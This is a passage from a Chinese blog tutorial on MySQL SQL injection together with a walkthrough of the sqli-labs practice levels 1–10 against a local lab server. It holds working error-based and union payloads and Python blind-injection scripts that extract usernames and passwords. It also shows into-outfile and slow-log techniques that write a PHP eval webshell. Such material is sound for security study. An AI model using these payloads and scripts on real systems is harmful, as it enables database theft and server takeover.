class="hljs-number">1</span>)</code></pre><p>解释</p><p>由于updatexml的第二个参数需要Xpath格式的字符串，以0x7e开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p><p><strong>extractvalue</strong></p><p>updatexml是修改的。而evtractvalue是查询的。从目标XML中返回包含所查询值的字符串。</p><p>EXTRACTVALUE (XML_document, XPath_string);</p><pre><code class="hljs sql">　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc　　第二个参数：XPath_string (Xpath格式的字符串)</code></pre><p>用法：最大长度限制32位</p><pre><code class="hljs sql">and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>))</code></pre><p>解释</p><p>依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p><h5 id="3-有关画图的七类"><a href="#3-有关画图的七类" class="headerlink" title="3.有关画图的七类"></a>3.有关画图的七类</h5><p>差不多都是和画图有关的，共同点是传入非正常参数导致报错和查询嵌套导致报错，所以我把它归为一类。</p><p><strong>geometrycollection()</strong></p><p>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p><pre><code class="hljs sql">POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。</code></pre><p>利用条件：5.5&lt;version()&lt;5.6</p><p>用法</p><pre><code class="hljs sql">and geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre><p>解释</p><p>由于MYSQL无法用这样字符串画出图形,所以报错了</p><p><strong>multipoint()</strong></p><p>　MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。</p><p>用法</p><pre><code class="hljs sql">and multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre><p>MultiPoint（）函数中是需要数字的，没有就报错了。。。</p><p><strong>polygon()</strong></p><p>在地区地图上，Polygon对象可表示森林、区等。</p><p>用法</p><pre><code class="hljs sql">and polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre><p>解释：</p><p>需要数字的，没有就报错了。。。</p><p><strong>multipolygon()</strong></p><p>　multipolygon()是一种由Polygon元素构成的几何对象集合。</p><p>用法</p><pre><code class="hljs n1ql">and multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre><p>解释：</p><p>　multipolygon()需要的是Polygon元素。为了显错传入字符串,所以报错。</p><p><strong>linestring()</strong></p><p>LineString()是具有点之间线性内插特性的Curve.</p><p>用法</p><pre><code class="hljs sql">and linestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre><p>解释：</p><p>LineString(1 1,2 2) 这是它的用法。为了显错传入了,字符串….</p><p><strong>multilinestring()</strong></p><p>multilinestring()是一种由LineStirng元素构成的MultiCurve几何对象集合。</p><p>用法</p><pre><code class="hljs sql">and multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre><p>解释：</p><p>MULTILINESTRING((10 10, 20 20), (15 15, 30 15))这样用的。为了显错又把字符串传进去了。</p><p><strong>exp()</strong></p><p>EXP(x)函数计算e的x次方，即ex。</p><p>用法</p><pre><code class="hljs sql">and exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));</code></pre><p>解释</p><p>　EXP()肯定是需要数字的,传入个字符串必然显错</p><h4 id="2-盲注"><a href="#2-盲注" class="headerlink" title="2.盲注"></a>2.盲注</h4><p>blind sql是注入攻击的一种，向数据库发送true或false的问题，并根据应用返回的信息判断结果。这种攻击的出现是因为应用程序只显示常规错误，但并没有解决sql注入存在的代码问题。</p><p>进行常规sql注入时，web界面会返回后端数据库执行sql查询返回的错误信息，盲注与常规注入相似，但是不同的是数据库返回的数据的检索方式，若数据库没有输出数据到web页面，攻击者会询问一些列的true或false问题，强制从数据库获取数据。</p><p>在有些情况下，后台使用了错误信息屏蔽方式(比如@)屏蔽了报错，此时无法根据报错信息来进行判断注入。</p><p>从安全角度讲，后台数据库返回错误提示，这给构造闭合语句的人提供了便利，为了解决这一安全问题，除了在后台设置相应的语句判断机制外，不提供对应的错误返回提示，或无论在什么情况下都提供相同的错误返回提示确实是一种降低渗透风险的方法。而盲注就是在后台不提供返回提示的情况下构造payload的方法，其实它本身也还是一种注入方式。</p><h5 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h5><p>即基于真假的盲注。主要有以下几种表现情况</p><p>1.<strong>没有报错信息</strong></p><p>2.不管正确的输入，还是错误的输入，都只显示<strong>两种情况</strong>(我们可以默认为0和1)</p><p>3.在正确的输入下，输入and1=1，and1=2发现可以判断返回结果信息</p><p>常使用以下语句猜解字符串：</p><pre><code class="hljs mysql">url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] select length(database()) --+           url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] select substr(database(),1,1) --+           url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] select ascii(substr(database(),1,1)) --+url?var&#x3D;1[&#39; | &quot; | ) | &#39;) | &quot;) ...] and ascii(substr(database(),1,1)) &gt; | &lt; | &#x3D; N --+</code></pre><p>一般来说<strong>二分法脚本</strong>如下：(来源于<a href="https://y4tacker.blog.csdn.net/">Y4tacker</a>)</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;url?id=1[&#x27; | &quot;</span> | ) | <span class="hljs-string">&#x27;) | &quot;) ...] and 1=&quot;</span><span class="hljs-string"></span><span class="hljs-string">result = &#x27;</span><span class="hljs-string">&#x27;</span><span class="hljs-string">i = 0</span><span class="hljs-string"></span><span class="hljs-string">while True:</span><span class="hljs-string">    i = i + 1</span><span class="hljs-string">    head = 32</span><span class="hljs-string">    tail = 127</span><span class="hljs-string"></span><span class="hljs-string">    while head &lt; tail:</span><span class="hljs-string">        mid = (head + tail) &gt;&gt; 1 #中值</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr(database(),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆当前数据库</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database()),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆当前数据库所有的表</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&quot;users&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆当前表的所有字段</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27;#爆用户名</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(password) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆密码</span><span class="hljs-string">        r = requests.get[ | POST ](url + payload, timeout=2)</span><span class="hljs-string">        if &#x27;</span>屏幕回显<span class="hljs-string">&#x27; in r.text:</span><span class="hljs-string">            head = mid + 1</span><span class="hljs-string">        else:</span><span class="hljs-string">            tail = mid</span><span class="hljs-string"></span><span class="hljs-string">    if head != 32:</span><span class="hljs-string">        result += chr(head)</span><span class="hljs-string">    else:</span><span class="hljs-string">        break</span><span class="hljs-string">print(result)</span></code></pre><p><strong>有时候屏幕回显很大一部分不好掌握，建议使用时间盲注。</strong></p><p>也可用burp进行爆破，但是步骤太多，太麻烦了。。</p><h5 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.时间盲注"></a>2.时间盲注</h5><p>由于<strong>注入点无法反馈信息</strong>，所以不能像其他注入方式那样直接简洁的获取信息，需要从侧面一步步拼凑出信息。</p><p> 常使用以下语句猜解字符串：</p><pre><code class="hljs mysql">url?var&#x3D;1[&#39; | &quot; | ) | &#39;) | &quot;) ...] and if(1&#x3D;0,1, sleep(10)) --+           url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] union select if(SUBSTRING(current,1,1)&#x3D;CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1 --+</code></pre><p>一般来说<strong>二分法脚本</strong>如下：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;url?id=1[&#x27; | &quot;</span> | ) | <span class="hljs-string">&#x27;) | &quot;) ...] and 1=&quot;</span><span class="hljs-string"></span><span class="hljs-string">result = &#x27;</span><span class="hljs-string">&#x27;</span><span class="hljs-string">i = 0</span><span class="hljs-string"></span><span class="hljs-string">while True:</span><span class="hljs-string">    i = i + 1</span><span class="hljs-string">    head = 32</span><span class="hljs-string">    tail = 127</span><span class="hljs-string"></span><span class="hljs-string">    while head &lt; tail:</span><span class="hljs-string">        mid = (head + tail) &gt;&gt; 1 #中值</span><span class="hljs-string">        payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr(database(),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #当前数据库名</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database()),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆表名</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&quot;users&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆字段</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆用户名</span><span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(password) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆密码</span><span class="hljs-string">        try:</span><span class="hljs-string">            r = requests.get[ | POST ](url + payload, timeout=2)</span><span class="hljs-string">            head = mid + 1</span><span class="hljs-string">        except Exception as e:</span><span class="hljs-string">            tail = mid</span><span class="hljs-string"></span><span class="hljs-string">    if head != 32:</span><span class="hljs-string">        result += chr(head)</span><span class="hljs-string">    else:</span><span class="hljs-string">        break</span><span class="hljs-string">print(result)</span></code></pre><h4 id="3-mysql注入读写文件"><a href="#3-mysql注入读写文件" class="headerlink" title="3.mysql注入读写文件"></a>3.mysql注入读写文件</h4><p>mysql数据库在渗透过程中能够使用的功能除了读取数据之外，还可以对文件进行读写。</p><h5 id="1-前提"><a href="#1-前提" class="headerlink" title="1.前提"></a>1.前提</h5><p>1.用户权限足够高，尽量具有root权限</p><p>2.secure_file_priv不为null(默认为null)</p><pre><code class="hljs mysql">查看secure_file_priv的值show global variables like &#39;%secure%&#39;;或者是直接搜全名show global variables like &#39;secure_file_priv&#39;;修改值:windows下：修改my.ini 在[mysqld]内加入secure_file_priv &#x3D;  #设置为空不对mysqld 的导入 | 导出做限制linux下：修改&#x2F;etc&#x2F;my.cnf 在[mysqld]内加入secure_file_priv &#x3D;若要将mysql的写入写出限制在某一目录下，只需secure_file_priv的值为该目录即可，例如：secure_file_priv&#x3D;&#x2F;tmp&#x2F;然后重启mysql，再查询secure_file_priv</code></pre><h5 id="2-读取文件"><a href="#2-读取文件" class="headerlink" title="2.读取文件"></a>2.读取文件</h5><p>读取文件load_file()</p><pre><code class="hljs mysql">url?id&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ] union select 1,load_file(&quot;path&quot;),[3,4...] --+注意路径需要双斜杠：\\</code></pre><h5 id="3利用into-outfile写入文件"><a href="#3利用into-outfile写入文件" class="headerlink" title="3利用into outfile写入文件"></a>3利用into outfile写入文件</h5><pre><code class="hljs mysql">url?id&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ] union select 1,&#39;&lt;?php @eval($POST_[1])?&gt;&#39;[3,4...] into outfile&#39;&#x2F;path&#x2F;文件名&#39; --+注意路径需要双斜杠：\\并且写马子的时候不能用&#39;&#39;，尽量使用数字作为密码，因为单引号会闭合前面的引号</code></pre><h5 id="4-利用日志写shell"><a href="#4-利用日志写shell" class="headerlink" title="4.利用日志写shell"></a>4.利用日志写shell</h5><p>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志，日志的详细情况参考<a href="http://blog.51cto.com/pangge/1319304">mysql日志详细解析</a>，本次利用查询日志</p><p>1.设置slow_query_log=1.即启用慢查询日志(默认禁用)。</p><pre><code class="hljs mysql">set global slow_query_log&#x3D;1;</code></pre><p>2.伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名</p><pre><code class="hljs mysql">set global slow_query_log_file&#x3D;&#39;dir\filename&#39;;#注意路径双写</code></pre><p>3.向日志文件写入shell</p><pre><code class="hljs mysql">select &#39;&lt;?php phpinfo();?&gt;&#39; or sleep(11);</code></pre><p>4.利用:浏览器直接访问该网站下的伪造的该日志文件路径</p><pre><code class="hljs coffeescript">ip<span class="hljs-regexp">/[dir/</span>]filename</code></pre><p>或者是把写入的内容改为一句话木马也可。</p><h2 id="2-靶场通关记录"><a href="#2-靶场通关记录" class="headerlink" title="2.靶场通关记录"></a>2.靶场通关记录</h2><h3 id="Less1：GET基于报错的字符型注入-单引号"><a href="#Less1：GET基于报错的字符型注入-单引号" class="headerlink" title="Less1：GET基于报错的字符型注入(单引号)"></a>Less1：GET基于报错的字符型注入(单引号)</h3><p>1.找到注入点：id</p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216160721715.png" alt="image-20210216160721715" style="zoom:80%;"><p>2.进行试错，猜测语句</p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216161133243.png" alt="image-20210216161133243" style="zoom:80%;"><p>则语句为：<code>select login_name,passwd from table where id = &#39;number&#39; limit 0,1</code></p><p>3.判断字段数：3</p><p>payload：<code>?id=1&#39;order by 4 --+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164833065.png" alt="image-20210216164833065" style="zoom:80%;"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164901146.png" alt="image-20210216164901146" style="zoom:80%;"></p><p>4.爆数据库</p><p>MySQL中的所有数据库：</p><p>payload：<code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216171624988.png" alt="image-20210216171624988"></p><p>当前正在使用的数据库以及系统的所有信息</p><p>payload：<code>?id=-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os),user()  --+</code></p><p>ps:<code>concat_ws</code>可替换为<code>group_concat</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216193609512.png" alt="image-20210216193609512"></p><p>5.爆表名     </p><p>payload：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</code></p><p>或者没有爆出当前表名：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195024012.png" alt="image-20210216195024012"></p><p>6.爆列名</p><p>payload：<code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195634870.png" alt="image-20210216195634870"></p><p>7.爆出所有账户密码</p><p>payload：<code>?id=-1&#39; union select 1,group_concat(username,password),3 from users --+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195854574.png" alt="image-20210216195854574"></p><h3 id="Less2：GET基于报错数字型注入"><a href="#Less2：GET基于报错数字型注入" class="headerlink" title="Less2：GET基于报错数字型注入"></a>Less2：GET基于报错数字型注入</h3><p>1.找到注入点：id</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216201108241.png" alt="image-20210216201108241"></p><p>2.试错，猜语句</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216202344713.png" alt="image-20210216202344713"></p><p>则语句：<code>select login_name,passwd from table where id = number limit 0,1</code></p><p>找到闭合了就和less1一样了剩下的</p><h3 id="Less3：GET基于报错字符型注入-带括号的单引号"><a href="#Less3：GET基于报错字符型注入-带括号的单引号" class="headerlink" title="Less3：GET基于报错字符型注入(带括号的单引号)"></a>Less3：GET基于报错字符型注入(带括号的单引号)</h3><p>1.寻找注入点：id</p><p>2.试错，猜语句</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217001833673.png" alt="image-20210217001833673"></p><p>则语句为：<code>select login_name,passwd from table where id=(&#39;1&#39;) limit 0,1</code></p><p>闭合找到后和less1剩下的操作一样了</p><h3 id="Less4：GET基于报错字符型注入-双引号"><a href="#Less4：GET基于报错字符型注入-双引号" class="headerlink" title="Less4：GET基于报错字符型注入(双引号)"></a>Less4：GET基于报错字符型注入(双引号)</h3><p>1.寻找注入点：id</p><p>2.试错，猜语句</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217003701458.png" alt="image-20210217003701458"></p><p>则语句为：<code>select login_name,passwd from table where id=(”1“) limit 0,1</code></p><p>剩下的操作参考less1</p><h3 id="Less5：GET双查询字符型-单引号"><a href="#Less5：GET双查询字符型-单引号" class="headerlink" title="Less5：GET双查询字符型(单引号)"></a>Less5：GET双查询字符型(单引号)</h3><p>这一关如果正确则显示you are in …,失败则会报错。这一关可以当作盲注解决，但是如题目一样使用双查询</p><p>payload</p><pre><code class="hljs mysql">#当前使用数据库?id&#x3D;-1&#39; union select 1,count(*), concat_ws(&#39;:&#39;,(select database()), floor(rand()*2))as a from information_schema.tables group by a --+</code></pre><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219001046483.png" alt="image-20210219001046483"></p><p>也可布尔盲注，参考less5</p><h3 id="Less6：GET双查询字符型-双引号"><a href="#Less6：GET双查询字符型-双引号" class="headerlink" title="Less6：GET双查询字符型(双引号)"></a>Less6：GET双查询字符型(双引号)</h3><p>和less5一样，只不过闭合是双引号。</p><h3 id="Less7：盲注GET文件写入"><a href="#Less7：盲注GET文件写入" class="headerlink" title="Less7：盲注GET文件写入"></a>Less7：盲注GET文件写入</h3><p>1.注入点：id</p><p>2.猜语句，经过多次实验，只有输入<code>&#39;</code>会报错</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217174821016.png" alt="image-20210217174821016"></p><p>没有错误提示，盲注，经过多次实验，以下可行</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217175333779.png" alt="image-20210217175333779"></p><p>则猜测语句注入点为：<code>?id=((&#39;1&#39;))</code></p><p>3.猜字段</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180130902.png" alt="image-20210217180130902"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180147338.png" alt="image-20210217180147338"></p><p>4.写shell</p><p>payload：<code>?id=-1&#39;)) union select 1,&#39;&lt;?php @eval($POST_[1])?&gt;&#39;3 into outfile&#39;C:\\test\\1.php&#39; --+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217183945287.png" alt="image-20210217183945287"></p><h3 id="Less8：GET布尔盲注"><a href="#Less8：GET布尔盲注" class="headerlink" title="Less8：GET布尔盲注"></a>Less8：GET布尔盲注</h3><p>1.注入点：id</p><p>2.猜关键点语句</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184401867.png" alt="image-20210217184401867"></p><p>没有错误提示，是盲注，只有一次次自己实验闭合</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184336953.png" alt="image-20210217184336953"></p><p>则关键点闭合为：<code>?id=&#39;1&#39;</code></p><p>3.猜字段：3</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193145935.png" alt="image-20210217193145935"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193201961.png" alt="image-20210217193201961"></p><p>4.跑数据，用二分法，用burp跑步骤太多了。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://192.168.43.78/sqli-labs/Less-8/?id=1&#x27; and 1=&quot;</span>result = <span class="hljs-string">&quot;&quot;</span>i=<span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:i=i+<span class="hljs-number">1</span>min_value = <span class="hljs-number">32</span>max_value = <span class="hljs-number">127</span>mid = (min_value+max_value)//<span class="hljs-number">2</span> <span class="hljs-comment">#中值</span><span class="hljs-keyword">while</span>(min_value&lt;max_value):payload = <span class="hljs-string">f&#x27;if(ascii(substr(database(),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)--+&#x27;</span> <span class="hljs-comment">#爆当前数据库名</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27;  #爆表名</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆字段</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆用户名</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆密码</span>html = requests.get(url + payload, timeout=<span class="hljs-number">2</span>)<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> html.text:            <span class="hljs-comment">#ascii值比mid值大</span>min_value = mid+<span class="hljs-number">1</span>   <span class="hljs-keyword">else</span>:max_value = midmid = (min_value+max_value)//<span class="hljs-number">2</span>    <span class="hljs-keyword">if</span> min_value != <span class="hljs-number">32</span>:result += chr(min_value)<span class="hljs-keyword">else</span>:<span class="hljs-keyword">break</span>print(result)</code></pre><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217202626517.png" alt="image-20210217202626517"></p><h3 id="Less9：GET时间盲注-单引号"><a href="#Less9：GET时间盲注-单引号" class="headerlink" title="Less9：GET时间盲注(单引号)"></a>Less9：GET时间盲注(单引号)</h3><p>1.注入点：id</p><p>2.试错，猜语句.猜鸭儿，试了很多语句都是一样的回显，看了眼后台果断懵逼，不会有第二种结果。。。</p><p>老规矩二分法</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://192.168.43.78/sqli-labs/Less-8/?id=1&#x27; and 1=&quot;</span>result = <span class="hljs-string">&#x27;&#x27;</span>i = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    i = i + <span class="hljs-number">1</span>    head = <span class="hljs-number">32</span>    tail = <span class="hljs-number">127</span>    <span class="hljs-keyword">while</span> head &lt; tail:        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span> <span class="hljs-comment">#中值</span>        payload = <span class="hljs-string">f&#x27;if(ascii(substr(database(),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,sleep(3))--+&#x27;</span> <span class="hljs-comment">#当前数据库名</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆表名</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆字段</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆用户名</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆密码</span>        <span class="hljs-keyword">try</span>:            r = requests.get(url + payload, timeout=<span class="hljs-number">2</span>)            head = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            tail = mid    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:        result += chr(head)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">break</span>print(result)</code></pre><h3 id="Less10：GET时间盲注-双引号"><a href="#Less10：GET时间盲注-双引号" class="headerlink" title="Less10：GET时间盲注(双引号)"></a>Less10：GET时间盲注(双引号)</h3><p>试了很多遍，结果都一样，看了眼后台果然不会有第二种结果。。直接上脚本</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;url/?id=1\&quot; and 1=&quot;</span>   <span class="hljs-comment">#\转义</span>result = <span class="hljs-string">&#x27;&#x27;</span>i = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    i = i + <span class="hljs-number">1</span>    head = <span class="hljs-number">32</span>    tail = <span class="hljs-number">127</span>    <span class="hljs-keyword">while</span> head &lt; tail:        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span>        payload = <span class="hljs-string">f&#x27;if(ascii(substr(database(),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,sleep(3))--+&#x27;</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>        <span class="hljs-keyword">try</span>:            r = requests.get(url + payload, timeout=<span class="hljs-number">2</span>)            head = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            tail = mid    <span 